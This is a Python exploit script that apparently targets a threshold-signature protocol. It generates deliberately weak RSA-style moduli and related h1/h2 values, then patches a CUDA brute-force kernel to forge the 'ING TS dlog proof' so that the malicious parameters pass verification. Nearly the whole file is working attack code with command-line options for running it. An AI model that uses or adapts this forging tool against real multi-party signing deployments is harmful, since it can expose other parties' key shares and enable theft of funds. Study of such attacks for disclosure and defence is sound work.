from Crypto.Hash import SHA512
from Crypto.Util.number import isPrime

from sympy import primerange, isprime, discrete_log, is_quad_residue, gcd
from sympy.ntheory.modular import crt
from typing import List, Tuple

from ctypes import *

import bisect
import random
import time
import os
import subprocess

import argparse
import sys

from cuda_run import work


SMALL_PRIMES = list(primerange(10 ** 3, 10 ** 4))
SECP256K1_Q = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

def search_prime(min_p, max_p) -> int:
    """Find a prime `p` such that Zp* is of smooth order."""
    lb = min_p // SMALL_PRIMES[-1] + 1
    ub = max_p // SMALL_PRIMES[0]
    while True:
        p = 2
        while p < lb:
            p *= random.choice(SMALL_PRIMES)
        if p > ub:
            continue
        p *= SMALL_PRIMES[bisect.bisect_right(SMALL_PRIMES, min_p // p)]
        p += 1
        if isprime(p):
            return p

def _hash_ints(ints: List[int], log=False) -> int:
    hash_obj = SHA512.new(truncate='256')
    full_buf = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        hash_obj.update(len(buf).to_bytes(2, "little"))
        hash_obj.update(buf)
        full_buf += len(buf).to_bytes(2, "little")
        full_buf += buf

    if log:
        full_buf = list(full_buf)
        extra = full_buf[128*4:]
        print("full ", len(full_buf), full_buf)
        print("extra", len(extra), extra)
        print(hash_obj.hexdigest())
    return int.from_bytes(hash_obj.digest(), "big")

def _hash_buffer(ints):
    r = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        r += len(buf).to_bytes(2, "little")
        r += buf
    return r

def _int_buffer(x):
    return x.to_bytes((x.bit_length() + 7) // 8, "big")

def get_hardcode_values(ints: List[int]) -> Tuple[List[int], int, List[int]]:
    full_buf = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        full_buf += len(buf).to_bytes(2, "little")
        full_buf += buf

    if sys.platform == "win32":
        endianess = "-DIS_LITTLE_ENDIAN=" + ("0", "1")[sys.byteorder == "little"]
        sha512dll = os.getcwd() + "/sha512.dll"
        subprocess.run(["clang++", "-o", sha512dll, "-shared", endianess, "sha512.cc"], shell=True)
    elif sys.platform == "linux":
        endianess = "-DIS_LITTLE_ENDIAN=" + ("0", "1")[sys.byteorder == "little"]
        sha512dll = os.getcwd() + "/sha512.so"
        subprocess.run(["clang++", "-o", sha512dll, "-shared", "-fPIC", endianess, "sha512.cc"], shell=False)
    else:
        print("urh, what platform are you on?")
        exit()

    sha512 = CDLL(sha512dll)
    get_iv = getattr(sha512, "get_iv")
    get_iv.argtypes = [POINTER(c_ubyte), c_size_t, c_ulonglong*8]

    iv = (c_ulonglong * 8)()
    l = len(full_buf)
    c = (c_ubyte * l)(*full_buf)

    get_iv(c, l, iv)
    return (list(map(int, iv)), l, list(full_buf[l - l % 128:]))

def modify_template(template: str, ints: List[int]) -> str:
    iv, original_len, suffix = get_hardcode_values(ints)

    custom_hash_iv = f"uint64_t h[8] = {{ {','.join(map(hex, iv))} }};"
    suffix_raw_bytes = f"uint8_t hbuf[512] = {{ {','.join(map(str, suffix))} }};"

    substitutions = [
        ("ORIGINAL_PREFIX_LEN", str(original_len - len(suffix))),
        ('SUFFIX_LEN', str(len(suffix))),
        ('SUFFIX_RAW_BYTES', suffix_raw_bytes),
        ('CUSTOM_HASH_IV', custom_hash_iv),
    ]

    for search, replacement in substitutions:
        template = template.replace(search, replacement)

    return template

SALT = int.from_bytes(b"ING TS dlog proof sub-protocol v1.0", "big")

def _gen_malicious_params(args):
    """Search for suitable p, q, h1, h2."""

    P_LENGTH = args.Pbit
    if args.p is not None:
        P_LENGTH = len(bin(args.p)) - 2
    if args.p is not None:
        Q_LENGTH = len(bin(args.q)) - 2

    N_LENGTH = args.Nbit
    assert N_LENGTH > P_LENGTH, "N is smaller than P"
    Q_LENGTH = N_LENGTH - P_LENGTH

    # search for p, q
    mask_p = (0b11 << (P_LENGTH - 2)) | 1
    mask_q = (0b11 << (Q_LENGTH - 2)) | 1

    print("generating p, q")

    if args.p is not None:
        p = args.p
        assert isPrime(p), "p provided is not prime"
    else:
        p = 0
        while not isPrime(p):
            p = random.getrandbits(P_LENGTH) | mask_p

    if args.q is not None:
        q = args.q
        assert isPrime(q), "q provided is not prime"
    else:
        q = 0
        while not (isprime(q) and gcd(p - 1, q - 1) == 2 and is_quad_residue(2, q)):
            q = search_prime(2 ** (N_LENGTH - 1) // p + 1, 2 ** N_LENGTH // p - 1)


    N = p * q
    phiN = (p - 1) * (q - 1)
    order = phiN // 4

    print("searching for h1, h2")
    h1 = 2
    h2 = int(crt([p, q], [1, 2])[0])
    while True:
        try:
            assert is_quad_residue(h1, p) and is_quad_residue(h1, q), "inappropriate h1"
            secret_q = discrete_log(q, h2, h1)
            assert pow(h1, secret_q, q) == h2 % q, "log(h2, base=h1, modulo=q) does not exist"
            secret = int(crt([(p - 1) // 2, (q - 1) // 2], [0, secret_q])[0])
            k = secret // ((p - 1) // 2)
            assert gcd(k, order) == 1, "k has no inverse"
            k_inv = pow(k, -1, order)
        except Exception as err:
            # print(err)
            h1 += 1
            continue
        break
    print("done searching for h1, h2")
    assert pow(h1, order, N) == 1
    assert pow(h2, order, N) == 1

    g, V = h2, h1
    assert g % p == 1 and g % q == 2
    inv_p_mod_q = pow(p, -1, q)

    template = open("brute.template.cu", "r").read()
    template_modified = modify_template(template, [SALT, N, g, V])
    open("brute.cu", "w").write(template_modified)

    r = work(
        p_buf=_int_buffer(p),
        q_buf=_int_buffer(q),
        p_inv_buf=_int_buffer(inv_p_mod_q),
        args=args,
        max_r=2**min(P_LENGTH+10, 64),)
    if r is not None:
        for rr in range(r,r+1):
            # x = pow(2, rr, q)
            x = pow(g, rr, N)
            c = _hash_ints([SALT, N, g, V, x])
            print("salt=", SALT)
            print("N=", N)
            print("g=", g)
            print("v=", V)
            print("x=", x)
            print("H1=", h1)
            print("H2=", h2)
            print("R=", rr)
            print("C=", c)
            print("P=", p)
            print("Q=", q)
            print("N=", N)
            print("c % (p - 1)/2 =", c % ((p - 1) // 2))
    proof_dlog_h2_base_h1 = None
    # else:
    #     # forge proof for log(h1, base=h2)
    #     g, V = h2, h1
    #     time_start = time.time()
    #     for r in range(p):
    #         c = _hash_ints([SALT, N, g, V, pow(g, r, N)])
    #         if c % (p - 1) == 0:
    #             break # Found
    #         if r%10000==0:
    #             print("Speed = ", (r+1)/((time.time()-time_start)*1000), "K/s")
    #     print("Speed = ", (r+1)/((time.time()-time_start)*1000), "K/s")
    y = (r - c // (p - 1)) % phiN
    proof_dlog_h1_base_h2 = (y, c)

    return p, q, h1, h2, proof_dlog_h2_base_h1, proof_dlog_h1_base_h2



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--p', type=int, required=False, help="Optional P value (random if not provided)")
    parser.add_argument('--q', type=int, required=False, help="Optional Q value (random if not provided)")
    parser.add_argument('--Nbit', type=int, required=False, help="Size of N (defaults 2048)", default=2048)
    parser.add_argument('--Pbit', type=int, required=False, help="Size of P")
    parser.add_argument('--Qbit', type=int, required=False, help="Size of Q")
    parser.add_argument('--threads', type=int, required=False, help="Number of threads per block (block dim), default to 256", default=256)
    parser.add_argument('--blocks', type=int, required=False, help="Number of blocks per grid (grid dim), default to 64", default=2**16)
    parser.add_argument('--kernels', type=int, required=False, help="Number of concurrent kernels to used, default to 1", default=1)
    parser.add_argument('--batch', type=int, required=False, help="Loop count of each threads, default 2^14", default=2**16)
    args = parser.parse_args()

    if args.p and args.q:
        args.Nbit = len(bin(args.p)) - 2 + len(bin(args.q)) - 2
    if args.p:
        args.Pbit = len(bin(args.p)) - 2
    if args.q:
        args.Qbit = len(bin(args.p)) - 2

    if all(map(lambda x: x is None, [args.p, args.q, args.Pbit])):
        print("atleast Pbit is required, if no p and q are given")
        exit(0)

    p, q, h1, h2, proof_dlog_h2_base_h1, proof_dlog_h1_base_h2 = _gen_malicious_params(args)

if __name__ == "__main__":
    main()
